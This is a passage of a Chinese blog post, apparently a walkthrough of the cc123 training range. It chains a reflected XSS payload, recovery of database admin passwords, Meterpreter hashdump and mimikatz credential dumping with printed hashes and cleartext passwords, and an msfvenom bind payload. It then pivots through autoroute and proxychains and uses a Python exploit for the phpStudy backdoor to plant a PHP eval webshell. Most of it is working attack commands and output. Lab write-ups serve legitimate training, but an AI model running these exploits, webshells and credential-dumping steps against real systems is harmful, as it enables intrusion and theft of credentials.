<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114105913840.png" alt="image-20220114105913840"></p>
<p>访问该文件</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1717n0zaUzimage-20220114110232582.png32" alt="image-20220114110232582"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1717I9ZyG1image-20220114110321901.png43" alt="image-20220114110321901"></p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ww2.cc123.com/mystat.aspx?style=&lt;/script&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1717cS3q71image-20220114113621777.png52" alt="image-20220114113621777"></p>
<h4 id="后台用户名密码秘文解密"><a href="#后台用户名密码秘文解密" class="headerlink" title="后台用户名密码秘文解密"></a>后台用户名密码秘文解密</h4><p>之前得到利用SQL MAP得到的用户名和密码都是无法直接获取的</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114120243875.png" alt="image-20220114120243875"></p>
<p>利用工具</p>
<p>查询配置文件中的数据库连接信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat web.config</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114120617365.png" alt="image-20220114120617365"></p>
<p>将其放入工具中 Go连接</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1717txn1Hfimage-20220114121533124.png26" alt="image-20220114121533124"></p>
<p>查询admin表内的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1717hdyMuJimage-20220114121751133.png52" alt="image-20220114121751133"></p>
<p>得到用户名密码信息</p>
<table>
<thead>
<tr>
<th>id</th>
<th>username</th>
<th>password</th>
<th>roleId</th>
</tr>
</thead>
<tbody><tr>
<td>28</td>
<td>admin</td>
<td>AE5F6187F32825CA</td>
<td>1</td>
</tr>
<tr>
<td>30</td>
<td>cc123</td>
<td>B97C57DB005F954242450A255217DA9F</td>
<td>1</td>
</tr>
</tbody></table>
<p>在MD5在线平台进行解密发现失败</p>
<p>寻找加密方法</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1621image-20220114142301537.png16" alt="image-20220114142301537"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114142325595.png28" alt="image-20220114142325595"></p>
<p>解密方法</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117130802644.png" alt="image-20220117130802644"></p>
<p>编写解密小工具</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117125851927.png" alt="image-20220117125851927"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117125940559.png" alt="image-20220117125940559"></p>
<p>填写key进行解密</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117130215277.png" alt="image-20220117130215277"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117130338775.png" alt="image-20220117130338775"></p>
<table>
<thead>
<tr>
<th>id</th>
<th>username</th>
<th>password</th>
<th>roleId</th>
</tr>
</thead>
<tbody><tr>
<td>28</td>
<td>admin</td>
<td>cc123</td>
<td>1</td>
</tr>
<tr>
<td>30</td>
<td>cc123</td>
<td>qweasd123</td>
<td>1</td>
</tr>
</tbody></table>
<h2 id="3-内网渗透"><a href="#3-内网渗透" class="headerlink" title="3.内网渗透"></a>3.内网渗透</h2><h3 id="3-1web服务器"><a href="#3-1web服务器" class="headerlink" title="3.1web服务器"></a>3.1web服务器</h3><h4 id="网段梳理"><a href="#网段梳理" class="headerlink" title="网段梳理"></a>网段梳理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p>192.168.137.134</p>
<p>10.10.10.135</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117150336674.png" alt="image-20220117150336674"></p>
<h4 id="获取路由信息"><a href="#获取路由信息" class="headerlink" title="获取路由信息"></a>获取路由信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117151100055.png" alt="image-20220117151100055"></p>
<h4 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117151331624.png" alt="image-20220117151331624"></p>
<h4 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117151748225.png" alt="image-20220117151748225"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 1580</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117151907379.png" alt="image-20220117151907379"></p>
<h4 id="获取哈希密码明文"><a href="#获取哈希密码明文" class="headerlink" title="获取哈希密码明文"></a>获取哈希密码明文</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117165606506.png" alt="image-20220117165606506"></p>
<blockquote>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c933df09b600efabee0791aaccc43f2:::</p>
<p>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
<p>MySQL_HWS:1001:aad3b435b51404eeaad3b435b51404ee:6a75a75e4cfd3cf00faf743e17e90a53:::</p>
<p>PhpMyAdmin_HWS:1002:aad3b435b51404eeaad3b435b51404ee:a14b615c584d6b043f42f1cfab9779cd:::</p>
<p>huweishen542147:1004:aad3b435b51404eeaad3b435b51404ee:c76eea2615348c5228f7027d3ccab02d:::</p>
<p>cc123:1005:aad3b435b51404eeaad3b435b51404ee:afdeb425b4a55982deb4e80fa3387576:::</p>
<p>newcc123:1007:aad3b435b51404eeaad3b435b51404ee:97824315153b4dd665d6c688f446ebf1:::</p>
<p>ww2cc123:1008:aad3b435b51404eeaad3b435b51404ee:adadf2dd832421c26a96705fd09a32bd:::</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117170110495.png" alt="image-20220117170110495"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117170931096.png" alt="image-20220117170931096"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wdigest/tspkg</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117171103054.png" alt="image-20220117171103054"></p>
<p>管理员的账号和密码：Administrator !@#Qwe123.</p>
<h3 id="3-2数据库服务器"><a href="#3-2数据库服务器" class="headerlink" title="3.2数据库服务器"></a>3.2数据库服务器</h3><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117172004612.png" alt="image-20220117172004612"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/sock4a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set SRVPORT 2222</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117174652378.png" alt="image-20220117174652378"></p>
<h4 id="配置proxychains"><a href="#配置proxychains" class="headerlink" title="配置proxychains"></a>配置proxychains</h4><p>kali攻击机：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p>绑定本机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 2222</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117174848494.png" alt="image-20220117174848494"></p>
<h4 id="NMAP扫描"><a href="#NMAP扫描" class="headerlink" title="NMAP扫描"></a>NMAP扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.10.10.136</span><br></pre></td></tr></table></figure>

<p>扫描速度比较慢 在扫描过程中发现80端口开放</p>
<p>测试是否可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains firefox http://10.10.10.136</span><br></pre></td></tr></table></figure>

<p>访问结果为不可访问</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117185650203.png" alt="image-20220117185650203"></p>
<h4 id="数据库服务器信息整理"><a href="#数据库服务器信息整理" class="headerlink" title="数据库服务器信息整理"></a>数据库服务器信息整理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt;netstat -ano</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118144511896.png" alt="image-20220118144511896"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt;ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118144711979.png" alt="image-20220118144711979"></p>
<h4 id="生成正向连接的攻击载荷"><a href="#生成正向连接的攻击载荷" class="headerlink" title="生成正向连接的攻击载荷"></a>生成正向连接的攻击载荷</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=13777 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118145830046.png" alt="image-20220118145830046"></p>
<p>上传载荷</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118151146581.png" alt="image-20220118151146581"></p>
<p>执行载荷</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118151224280.png" alt="image-20220118151224280"></p>
<h4 id="连接获取session"><a href="#连接获取session" class="headerlink" title="连接获取session"></a>连接获取session</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bin_tcp</span><br><span class="line">set LPORT 13777</span><br><span class="line">set RHOST 10.10.10.136</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118153143998.png" alt="image-20220118153143998"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220118153232512.png" alt="image-20220118153232512"></p>
<h4 id="网段梳理-1"><a href="#网段梳理-1" class="headerlink" title="网段梳理"></a>网段梳理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p>10.10.10.136</p>
<p>10.10.1.128</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-45-27-image.png" alt="img"></p>
<h4 id="获取路由信息-1"><a href="#获取路由信息-1" class="headerlink" title="获取路由信息"></a>获取路由信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-47-37-image.png" alt="img"></p>
<h4 id="查看权限-1"><a href="#查看权限-1" class="headerlink" title="查看权限"></a>查看权限</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-47-57-image.png" alt="img"></p>
<h4 id="迁移进程-1"><a href="#迁移进程-1" class="headerlink" title="迁移进程"></a>迁移进程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-48-46-image.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 1532</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-49-25-image.png" alt="img"></p>
<p>获取哈希密码明文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-50-30-image.png" alt="img"></p>
<blockquote>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:15132c3d36a7e5d7905e02b478979046::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-15-58-31-image.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-00-52-image.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wdigest/tspkg</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-02-23-image.png" alt="img"></p>
<p>管理员的账号和密码：Administrator !@#QWEasd123.</p>
<h3 id="3-3目标服务器"><a href="#3-3目标服务器" class="headerlink" title="3.3目标服务器"></a>3.3目标服务器</h3><h4 id="添加路由-1"><a href="#添加路由-1" class="headerlink" title="添加路由"></a>添加路由</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.1.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-32-51-image-2560742.png" alt="img"></p>
<p>NMAP扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.10.1.129</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-17-58-57-image-2560742.png" alt="img"></p>
<p>扫描速度比较慢 ，在扫描过程中发现80端口开放，测试是否可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 firefox http://10.10.1.129</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-47-17-image-2560743.png" alt="img"></p>
<p>发现是phpstudy PHP版本为5.4.45</p>
<p>搜索phpstudy后门事件</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-16-59-33-image-2560742.png" alt="img"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-17-08-29-image-2560741.png" alt="img"></p>
<blockquote>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43571641/article/details/119831173">phpStudy后门漏洞复现_LuckySec-CSDN博客_phpstudy漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11610061.html">phpStudy后门漏洞利用复现 - 雨中落叶 - 博客园</a></p>
</blockquote>
<h4 id="编写phpstudy后门exp"><a href="#编写phpstudy后门exp" class="headerlink" title="编写phpstudy后门exp"></a>编写phpstudy后门exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim phpstudy.py</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-14-03-image-2560741.png" alt="img"></p>
<blockquote>
<p>#conding:utf-8</p>
<p>import requests import sys import base64</p>
<p>shell &#x3D; “system(‘“+sys.argv[1]+”‘);” shell_base64 &#x3D; base64.b64encode(shell.encode(‘utf-8’))</p>
<p>header&#x3D;{‘Accept-charset’:shell_base64,’Accept-Encoding’:’gzip,deflate’}</p>
<p>def exploit(url): html &#x3D; requests.get(url&#x3D;url,headers&#x3D;header).text return html</p>
<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://10.10.1.129/&quot;">http://10.10.1.129/&quot;</a> print(exploit(url))</p>
</blockquote>
<h5 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 python3 phpstudy.py &quot;echo ^&lt;?php @eval(\$_POST[\&quot;shell\&quot;])?^&gt;&gt;c:\phpstudy\WWW\shell.php&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-17-47-image-2560742.png" alt="img"></p>
<h5 id="访问后门shell-php"><a href="#访问后门shell-php" class="headerlink" title="访问后门shell.php"></a>访问后门shell.php</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-19-24-image-2560742.png" alt="img"></p>
<h4 id="使用SocksCap64设置本机代理"><a href="#使用SocksCap64设置本机代理" class="headerlink" title="使用SocksCap64设置本机代理"></a>使用SocksCap64设置本机代理</h4><h5 id="kali内配置proxychains"><a href="#kali内配置proxychains" class="headerlink" title="kali内配置proxychains"></a>kali内配置proxychains</h5><p>确认kali的IP</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-27-52-image-2560742.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-30-20-image-2560741.png" alt="img"></p>
<h5 id="本机内添加代理"><a href="#本机内添加代理" class="headerlink" title="本机内添加代理"></a>本机内添加代理</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-34-57-image-2560742.png" alt="img"></p>
<p>测试代理是否正常</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-35-52-image-2560742.png" alt="img"></p>
<h5 id="代理蚁剑"><a href="#代理蚁剑" class="headerlink" title="代理蚁剑"></a>代理蚁剑</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-47-33-image-2560742.png" alt="img"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-48-28-image-2560742.png" alt="img"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-49-01-image-2560742.png" alt="img"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-54-48-image-2560742.png" alt="img"></p>
<h5 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h5><p>上传bind.exe</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-52-54-image-2560742.png" alt="img"></p>
<h5 id="执行bind-exe"><a href="#执行bind-exe" class="headerlink" title="执行bind.exe"></a>执行bind.exe</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-18-18-55-36-image-2560742.png" alt="img"></p>
<h5 id="生成正向连接的攻击载荷-1"><a href="#生成正向连接的攻击载荷-1" class="headerlink" title="生成正向连接的攻击载荷"></a>生成正向连接的攻击载荷</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">set LPORT 13777</span><br><span class="line">set RHOST 10.10.1.129</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-19-10-image-2560744.png" alt="img"></p>
<h5 id="迁移进程-2"><a href="#迁移进程-2" class="headerlink" title="迁移进程"></a>迁移进程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-21-54-image-2560744.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 1340</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-22-36-image-2560742.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">arp -a</span><br><span class="line">systeminfo</span><br><span class="line">Ctrl+C返回</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-24-46-image-2560743.png" alt="img"></p>
<p>获取4个flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">sessions</span><br><span class="line">sessions -i 3</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-09-29-06-image-2560744.png" alt="img"></p>
<p>flag1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 3</span><br></pre></td></tr></table></figure>

<p>web服务器内</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-10-37-57-image-2560743.png" alt="img"></p>
<p>flag2</p>
<p>web服务器内</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-10-39-08-image-2560744.png" alt="img"></p>
<p>flag3</p>
<p>数据库服务器内</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 4</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-10-40-53-image-2560745.png" alt="img"></p>
<p>flag4</p>
<p>目标服务器内</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 8</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/2022-01-19-10-42-31-image.png" alt="img"></p>
</div></article></div></main><footer><div class="paginator"><a href="/2022/02/14/week7/" class="prev">PREV</a><a href="/2022/01/14/week6/" class="next">NEXT</a></div><div id="disqus_thread"></div><script>var disqus_shortname = 'seansun';
var disqus_identifier = '2022/01/20/moon4/';
var disqus_title = '暗月项目四-cc123靶场';
var disqus_url = 'http://example.com/2022/01/20/moon4/';
(function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//seansun.disqus.com/count.js" async></script><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>